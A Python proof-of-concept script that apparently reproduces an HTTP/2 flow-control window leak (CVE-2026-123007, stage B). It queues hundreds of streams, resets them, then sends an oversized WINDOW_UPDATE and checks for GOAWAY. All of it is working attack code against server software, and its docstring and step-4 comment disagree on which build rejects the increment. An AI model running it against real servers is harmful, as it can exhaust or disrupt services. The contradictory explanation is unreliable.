#!/usr/bin/env python3
"""CVE-2026-123007 stage B: cleanup does not give the window back.

Same drift, but here the client RSTs every stream afterwards.  Stream cleanup
must release the connection window again; in 1.31.8 it does not, so the single
WINDOW_UPDATE that follows - legal against the drifted window - lands on an
already-full window and the server has to close the connection.

Also reports how many bytes the server managed to send while the socket was
blocked, i.e. how many frames really piled up.

Self-contained: uses the vendored h2/hpack/hyperframe in ./_vendor.
"""
import os
import socket
import ssl
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "_vendor"))

import h2.config  # noqa: E402
import h2.connection  # noqa: E402

HOST = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 18443
N = int(sys.argv[1]) if len(sys.argv) > 1 else 400
MAX = 2 ** 31 - 1

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])
s = ctx.wrap_socket(socket.create_connection((HOST, PORT)), server_hostname="localhost")
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024)

c = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
c.initiate_connection()
c.update_settings({h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: MAX,
                   h2.settings.SettingCodes.MAX_CONCURRENT_STREAMS: 5000})
s.sendall(c.data_to_send())

H = lambda: [(b":method", b"GET"), (b":path", b"/big.bin"),
             (b":scheme", b"https"), (b":authority", b"localhost")]


def wu(inc, sid=0):
    return bytes([0, 0, 4, 0x8, 0]) + sid.to_bytes(4, "big") + inc.to_bytes(4, "big")


# 1) window to its legal maximum
s.sendall(wu(MAX - 65535))
time.sleep(0.3)

# 2) N streams: HEADERS stay unsent behind the blocked socket
for i in range(N):
    c.send_headers(3 + 2 * i, H(), end_stream=True)
s.sendall(c.data_to_send())
time.sleep(2.0)
print("queued")

# 3) reset all but the last stream
tries = 0
for i in range(N - 1):
    try:
        s.sendall(bytes([0, 0, 4, 0x3, 0]) + (3 + 2 * i).to_bytes(4, "big") + b"\x00\x00\x00\x00")
    except Exception:
        tries += 1
print("rst done", "sendfail", tries)
time.sleep(1.0)

# 4) ask for a full window again.  A build that gives the window back on
#    stream cleanup sits at MAX here and MUST reject this increment; a build
#    that leaks the window silently accepts it.
try:
    s.sendall(wu(MAX - 65535))
except Exception as e:
    print("wu err", type(e).__name__)
print("leak wu sent")

# 5) collect the answer: GOAWAY (frame type 0x7) means the increment was
#    rejected, a still-open socket means it was accepted.
goaway = 0
closed = 0
s.settimeout(2)
try:
    while True:
        d = s.recv(65536)
        if not d:
            closed = 1
            break
        off = 0
        while off + 9 <= len(d):
            length = int.from_bytes(d[off:off + 3], "big")
            ftype = d[off + 3]
            if ftype == 0x7:
                goaway = 1
            off += 9 + length
except socket.timeout:
    pass
except Exception as e:
    print("recv err", type(e).__name__)
print("leak goaway", goaway, "closed", closed)
print("accepted", 0 if goaway else 1)
